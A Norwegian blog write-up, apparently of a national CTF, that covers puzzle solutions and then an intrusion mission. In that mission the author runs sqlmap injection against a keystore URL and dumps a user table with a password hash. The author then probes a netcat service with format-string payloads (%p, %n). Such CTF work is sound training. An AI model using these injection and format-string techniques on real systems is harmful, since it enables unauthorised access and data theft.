+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'39,41p'&lt;/span&gt; streets/Hart_Place
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SEE INTERVIEW #47246024
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;interviews/interview-47246024
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Ms. Sun has brown hair and is not from New Zealand.  Not the witness from the cafe.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nuvel, da får vi se på Annabel Church da&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'178,180p'&lt;/span&gt; streets/Buckingham_Place
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SEE INTERVIEW #699607
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;interviews/interview-699607
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Interviewed Ms. Church at 2:04 pm.  
+Witness stated that she did not see anyone she could identify as the shooter, 
+that she ran away as soon as the shots were fired.
+However, she reports seeing the car that fled the scene.  
+Describes it as a blue Honda, with a license plate that starts with &quot;L337&quot; and ends with &quot;9&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A3&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;^License Plate L337.*9$&quot;&lt;/span&gt; vehicles | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A2&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;^Make: Honda$&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A1&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;^Color: Blue$&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Owner: Erika Owens
+Owner: Aron Pilhofer
+Owner: Heather Billings
+Owner: Joe Germuska
+Owner: Victor Sidney
+Owner: Jacqui Maher
+Erika Owens     F       56      Trapelo Street, line 98
+Aron Pilhofer   M       16      Claybourne Street, line 145
+Heather Billings        F       38      Culbert Street, line 19
+Joe Germuska    M       65      Plainfield Street, line 275
+Victor Sidney   M       34      Dunstable Road, line 284
+Jacqui Maher    F       40      Andover Road, line 224
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'98,98p'&lt;/span&gt; streets/Trapelo_Street
+&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'145,145p'&lt;/span&gt; streets/Claybourne_Street
+&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'19,19p'&lt;/span&gt; streets/Culbert_Street
+&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'275,275p'&lt;/span&gt; streets/Plainfield_Street
+&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'284,284p'&lt;/span&gt; streets/Dunstable_Road
+&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'224,224p'&lt;/span&gt; streets/Andover_Road
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SEE INTERVIEW #5455315
+SEE INTERVIEW #1767435
+SEE INTERVIEW #2939888
+SEE INTERVIEW #29741223
+SEE INTERVIEW #9620713
+SEE INTERVIEW #904020
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;interviews/interview-5455315
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;interviews/interview-1767435
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;interviews/interview-2939888
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;interviews/interview-29741223
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;interviews/interview-9620713
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;interviews/interview-904020
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Victor Sidney:
+Home appears to be empty, no answer at the door.
+After questioning neighbors, appears that the occupant may have left for a trip recently.
+Considered a suspect until proven otherwise, but would have to eliminate other suspects to confirm.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En rask liten sjekk i membercard registeret viser at Victor Sidney har medlemsskap i alle klubbene, 
+Victor Sidney er morderen.&lt;/p&gt;
+
+&lt;h3 id=&quot;knock-knock&quot;&gt;Knock knock&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vi får en video, og kun det.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Det er ikke ut til at det er noe skjulte filer i videoen eller. 
+Videoen er av en dukke som banker på et gjerde, jeg tipper på morsekode så jeg henter ut lyden og dumper den inn i &lt;a href=&quot;https://www.audacityteam.org/&quot;&gt;audacity&lt;/a&gt;
+for manuell analysering. Det viser seg at det sannsynligvis IKKE er morse, for der ble resultatet bare søppel.
+Videoen avsluttes med to matematiske konstruksjoner:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;MathJax_Preview&quot;&gt;A = [a_{ij}]_{n,m}&lt;/code&gt;&lt;script type=&quot;math/tex&quot;&gt;A = [a_{ij}]_{n,m}&lt;/script&gt;&lt;br /&gt;
+&lt;code class=&quot;MathJax_Preview&quot;&gt;A^T = [a_{ji}]_{m,n}&lt;/code&gt;&lt;script type=&quot;math/tex&quot;&gt;A^T = [a_{ji}]_{m,n}&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;Dette er en standard måte å definere en matrise og den &lt;a href=&quot;https://en.wikipedia.org/wiki/Transpose&quot;&gt;transponerte matrisen&lt;/a&gt;.
+Kan hente meldingen ligger skjult i lyden, og ved å transponere, så kan man få ut noe fornuftig? Men det er ikke tilfelle.
+&lt;a href=&quot;https://exiftool.org/&quot;&gt;exiftool&lt;/a&gt; gir oss litt ekstra informasjon:
+Filmen er laget vha Adobe Premiere, den ligger i folder kensentme (Ken sent me). Jeg finner ikke ut av noe ekstra med
+denne informasjonen, men det at filmen heter knock knock, og den har en matrise som avslutning hinter til at det er en
+&lt;a href=&quot;https://en.wikipedia.org/wiki/Tap_code&quot;&gt;tap cipher&lt;/a&gt;.
+Ved å registrere taps (lett med audacity) og punche inn i &lt;a href=&quot;https://www.dcode.fr/tap-cipher&quot;&gt;https://www.dcode.fr/tap-cipher&lt;/a&gt;
+så får vi resultatet: ORDETDULETERETTERERTAPDANCE, altså TAP DANCE.&lt;/p&gt;
+
+&lt;h3 id=&quot;lett---runer&quot;&gt;Lett - runer&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Her får vi presentert et bilde an noe som ser ut som runer.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2020-etjenesten/runer.png&quot; alt=&quot;runer&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ved å lese litt om runer og futhark, så kan man oversette runene til latinsk alfabet, og vi får dette resultatet:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AUTFH
+NKRRU
+IREER
+ETENR
+TSASN
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Første linje leses nesten som futhark, så ved å skyfle litt rundt på kolonnene (42351), så får man en fornuftig setning.
+futharkrunererinteressant&lt;/p&gt;
+
+&lt;h3 id=&quot;lett---sharing-secrets&quot;&gt;Lett - Sharing secrets&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Her får vi en introduksjon til Sharing secrets.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Denne krever at man faktisk kjører et program for å løse, og man finner det man trenger på &lt;a href=&quot;https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing&quot;&gt;wikipedia&lt;/a&gt;.
+Jeg hadde litt problemer med å løse denne, men det var fordi jeg ikke er noe spesiellt flink til å lese hint.
+Ved å løse oppgaver, så får man flere og flere secrets tilgjengelig får å løse for k=3, k=4 osv.
+Etterhvert som oppgaver blir løst, er det bare å gå tilbake til denne, legge inn secrets, få ut svaret og punche inn i
+scoreboard.&lt;/p&gt;
+
+&lt;h3 id=&quot;middels---artwork&quot;&gt;Middels - Artwork&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Her får vi et bilde.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2020-etjenesten/dbc6486d9c1788ccce2f4ece3e498fb3.png&quot; alt=&quot;Artwork&quot; /&gt;
+Her måtte jeg få et lite hint som dyttet meg i riktig retning, men ellers så var denne grei.
+Filnavnet er en hash, som lett kan crackes til “esoteric”. I bildet er det en tekst, “intellect confuses intuition”.
+Toppen av bildet ser ut til å være akkurat samme som bunnen, bare invertert. fire horisontale linjer, en haug 
+vertikale linjer i forskjellig lengde og farge, pluss en krøll her og der.
+Steganalyse av bildet gir meg ingenting. Jeg begynte på å finne et mønster for bredde for å se om det kunne være bokstaver som faktisk er enkodet.
+På dette tidspunkt fikk jeg et hint om å bruke mine ville Google foo skillz, som til slutt sa hva dette bildet faktisk er.
+Assembled Piet Code.
+&lt;a href=&quot;https://www.bertnase.de/npiet/&quot;&gt;https://www.bertnase.de/npiet/&lt;/a&gt;
+&lt;a href=&quot;https://www.dangermouse.net/esoteric/piet/samples.html&quot;&gt;https://www.dangermouse.net/esoteric/piet/samples.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Ved å bruke en &lt;a href=&quot;https://www.bertnase.de/npiet/npiet-execute.php&quot;&gt;online tjeneste for piet&lt;/a&gt;, så fikk vi iallefall noe fornuftig ut.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Part 1: HAVAL('mondrian')
+Part 2: Enter password:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nok et online tool for HAVAL ga oss korrekt svar på del 1.
+&lt;a href=&quot;http://www.unit-conversion.info/texttools/haval/&quot;&gt;http://www.unit-conversion.info/texttools/haval/&lt;/a&gt;.
+For del to så måtte jeg gå litt hardere til verks. Jeg begynte med &lt;a href=&quot;https://github.com/Ramblurr/PietCreator&quot;&gt;https://github.com/Ramblurr/PietCreator&lt;/a&gt;
+som er et gui for å skrive Piet Programmer, og den fikk lett til å åpne bildet.
+Ved å leke litt med å bytte ut instruksjoner med NOP så kom jeg endelig fram til hva som skjer etter at man har skrevet inn et passord, 
+og der ser det ut til at en og en bokstav blir sjekket vha litt matematikk.
+dette programmet var ugruelig ustabilt, så jeg byttet til &lt;a href=&quot;https://www.bertnase.de/npiet/&quot;&gt;npiet&lt;/a&gt;, og aktiverte
+trace funksjonen for å se hvordan stacken var hvis jeg sendte inn en A som passord.
+det var meningen at stacken skulle ende opp etter hver bokstav med ett element, men hvis en bokstav var feil så ender
+stacken opp en to elementer, hvor det ene elementet faktisk er offset fra korrekt bokstav til A.
+Litt kalkulator og bokstav for bokstav så fikk jeg bygd opp passordet som jeg har glemt å notert ned, 
+men såvidt jeg husker var det Tr0ub4dor&amp;amp;3.
+Ved å punche inn dette passordet får man correct horse battery stable. Finfin referanse til &lt;a href=&quot;https://xkcd.com/936/&quot;&gt;xkcd&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;middels---explosion&quot;&gt;Middels - Explosion&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Vi får et binærprogram, hvor vi må reversere for å forstå hvordan dette fungerer.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nope! Denne tok jeg ikke i det hele tatt.&lt;/p&gt;
+
+&lt;h2 id=&quot;selve-oppdraget&quot;&gt;Selve Oppdraget&lt;/h2&gt;
+&lt;p&gt;Denne seksjonen blir ikke så veldig strukturert, og sannsynligvis en blanding av norsk og engelsk, 
+for den blir skrevet lenge etter at den ble gjort og notatene mine fra den tiden har rom for forbedringer.
+Jeg dumper det uansett ut relativt uformattert. 😌&lt;/p&gt;
+
+&lt;h2 id=&quot;situasjon&quot;&gt;Situasjon&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Vi har mottatt informasjon om at en ukjent trusselaktør har fått tilgang
+til maskiner knyttet til et av våre departementer. Basert på nåværende
+situasjonsforståelse er det lite som er kjent om hendelsesforløpet. Trusselen
+kommer fra en aktør i utlandet, trolig en aktør med omfattende ressurser.
+
+Initiell analyse tilsier at aktøren eksfiltrerer data til domenet
+cloud-c2-70, på port 1337/TCP. Formatet er ukjent.
+
+Det er også observert trafikk knyttet til aktøren mot denne nettadressen:
+http://keystore/query.php?keyname=oper@cloud-mgr-15
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;oppdrag&quot;&gt;Oppdrag&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Vi trenger informasjon om trusselaktørens kapabiliteter og intensjon.
+
+Initielt ønsker vi å få vite hvem som lastet opp nøkler til
+keystore.
+
+Videre er din oppgave er å få tilgang til serveren cloud-c2-70
+og forsøke å avdekke hva som er stjålet i angrepet. Informasjon om
+trusselaktørens verktøy, infrastruktur, sertifikater og nøkler kan også
+være av interesse.
+
+Viktig: Før du kan sette i gang med oppdraget må du logge ut og
+kjøre kommandoen:
+
+────────────────────
+$ ssh login@ctf.cybertalent.no START-OPPDRAG
+────────────────────
+
+Lykke til!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;sql-injection&quot;&gt;SQL injection&lt;/h2&gt;
+&lt;p&gt;Uploaded sqlmap, and found that the keyname is vulnerable to sql injection.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 sqlmap.py &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://keystore/query.php?keyname&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;oper@cloud-mgr-15 &lt;span class=&quot;nt&quot;&gt;--random-agent&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--delay&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;so, what now? poke around in the db a bit first.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 sqlmap.py &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://keystore/query.php?keyname&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;oper@cloud-mgr-15 &lt;span class=&quot;nt&quot;&gt;--random-agent&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--delay&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6 &lt;span class=&quot;nt&quot;&gt;-bck-end&lt;/span&gt; DBMS: MySQL &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; 5.0.12
+banner: &lt;span class=&quot;s1&quot;&gt;'8.0.19'&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;--current-user&lt;/span&gt;
+current user: &lt;span class=&quot;s1&quot;&gt;'keystore@%'&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;--current-db&lt;/span&gt;
+current database: &lt;span class=&quot;s1&quot;&gt;'keystore'&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;--is-dba&lt;/span&gt;
+False
+
+&lt;span class=&quot;nt&quot;&gt;--users&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'keystore'&lt;/span&gt;@&lt;span class=&quot;s1&quot;&gt;'%'&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;--passwords&lt;/span&gt;
+No results.
+
+&lt;span class=&quot;nt&quot;&gt;--privileges&lt;/span&gt; 
+privilege: USAGE
+
+&lt;span class=&quot;nt&quot;&gt;--roles&lt;/span&gt;
+role: USAGE
+
+&lt;span class=&quot;nt&quot;&gt;--dbs&lt;/span&gt;
+information_schema
+keystore
+
+&lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; keystore &lt;span class=&quot;nt&quot;&gt;--tables&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3 tables]
++-----------------+
+| keystore        |
+| user_key_upload |
+| userstore       |
++-----------------+
+
+&lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; keystore &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt;
+actual key &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;17693
+uploaded:  
+key_id, user_id, &lt;span class=&quot;nb&quot;&gt;time
+&lt;/span&gt;17693,20524,1083438277
+user uploaded:
+user_id,user_name,user_password
+20524,Elliot Alderson,014aedf1bc63277183ae5034c023c8ba
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;whats-next&quot;&gt;Whats next?&lt;/h2&gt;
+&lt;p&gt;Vi fikk litt mer informasjon:
+    Vi har indikasjoner på at aktørens kryptonøkkel-generator har en bakdør. Kan du undersøke videre?&lt;/p&gt;
+
+&lt;p&gt;Her gikk jeg litt i alle retninger før jeg fant ut hvor jeg skulle videre.
+Litt mer SQL injection.
+same user has uploaded several keys:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;12072,20524,1555605348
+13941,20524,986626492
+14074,20524,1291346859
+14347,20524,1410200316
+15572,20524,1111329525
+15887,20524,1332499533
+16048,20524,1026833399
+16986,20524,1437342107
+17245,20524,1072842646
+17462,20524,1529238164
+17693,20524,1083438277
+18008,20524,1176764506
+18358,20524,1236242269
+18407,20524,1098316055
+18435,20524,1100795486
+18456,20524,1111066872
+18617,20524,1359818045
+18813,20524,1304052798
+18876,20524,1237690662
+19044,20524,1010123619
+19408,20524,959551014
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Almost all of them are active. Can this be exploited? Obviously not with my knowledge at this point,
+but exploration is allowed. 😁
+We can probably look closer at &lt;a href=&quot;https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54&quot;&gt;Upgrade Your SSH Key to Ed25519&lt;/a&gt;
+Looking at RsaCtfTool and RSHack, try to see what we got with our two public keys.
+&lt;a href=&quot;https://github.com/Ganapati/RsaCtfTool&quot;&gt;RsaCtfTool&lt;/a&gt;
+&lt;a href=&quot;https://github.com/zweisamkeit/RSHack&quot;&gt;RSHack&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Starting with cloud-hq-42
+Of the keys, these servers are active:
+    cloud-hq-42
+      ports open: 22 
+    cloud-c2-70&lt;/p&gt;
+
+&lt;p&gt;Found nothing for RSA, but I have connection to the cloud-c2-70 1337 server.
+Trying to figure out how this works.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat cloud-c2-70 1337
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;
+/lootd: available commands: &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;, upload, download, &lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt;, &lt;span class=&quot;nb&quot;&gt;uptime&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; tut
+./lootd: unknown &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'tut'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I fuzzed manually to see if any characters was behaving unormally.
+download and upload takes parameters, which we can break with segmentation fault.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%e - ./lootd: unknown &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'6.922279e-310'&lt;/span&gt;
+%u - ./lootd: unknown &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'2753872103'&lt;/span&gt;
+%i - ./lootd: unknown &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'-1541095193'&lt;/span&gt;
+%o - ./lootd: unknown &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'24411140347'&lt;/span&gt;
+%p - ./lootd: unknown &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'0x5628a424c0e7'&lt;/span&gt;
+%a - ./lootd: unknown &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'0x1.fdb6326547p-1028'&lt;/span&gt;
+%d same as %u
+%f - ./lootd: unknown &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'0.000000'&lt;/span&gt;
+%g - almost same as %e
+%x -  ./lootd: unknown &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'12a960e7'&lt;/span&gt;
+%m - ./lootd: unknown &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'Invalid argument/No error information'&lt;/span&gt;
+%n - goes into another context.
+&lt;span class=&quot;s1&quot;&gt;'%n '&lt;/span&gt; - ./lootd SIG#11 Segmentation fault
+./lootd: unknown &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I had no idea what to do next, but after some googling:
+ooooo, a format string vulnerability?&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+./lootd: unknown &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'0x55a76b1490e7 0xffffffff 0 0x7fff34c75da8 0 0x7fff34c75ff0 0x55a76b148af6 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x70252070 0 0'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Oh yes, now to figure out how to exploit this, as I have never done something like this before. 🙄
+Step by step (and RTFM):
+&lt;a href=&quot;https://www.defcon.org/images/defcon-18/dc-18-presentations/Haas/DEFCON-18-Haas-Adv-Format-String-Attacks.pdf&quot;&gt;DEFCON-18-presentation&lt;/a&gt;
+Also check out the youtube videos for these slides.
+Deep insight:
+&lt;a href=&quot;https://www.win.tue.nl/~aeb/linux/hh/formats-teso.html&quot;&gt;Good old paper&lt;/a&gt;
+read documentation for &lt;a href=&quot;https://github.com/Gallopsled/pwntools&quot;&gt;python pwntools&lt;/a&gt; fmtstr
+Also bought the book &lt;a href=&quot;https://www.handsonsecurity.net/&quot;&gt;Computer  Internet Security&lt;/a&gt;
+Ok, Lets try to write our own exploiter.
+Start by writing a skeleton that send code to the server first, and retrieve the results.
+actually trying pwntools, perhaps I cxan learn something new.
+Seems it’s a buffer overflow, 135 chars is ok, 136 crashes.
+Back to pwntools.
+Ok, leaking 64 bit addresses.&lt;/p&gt;
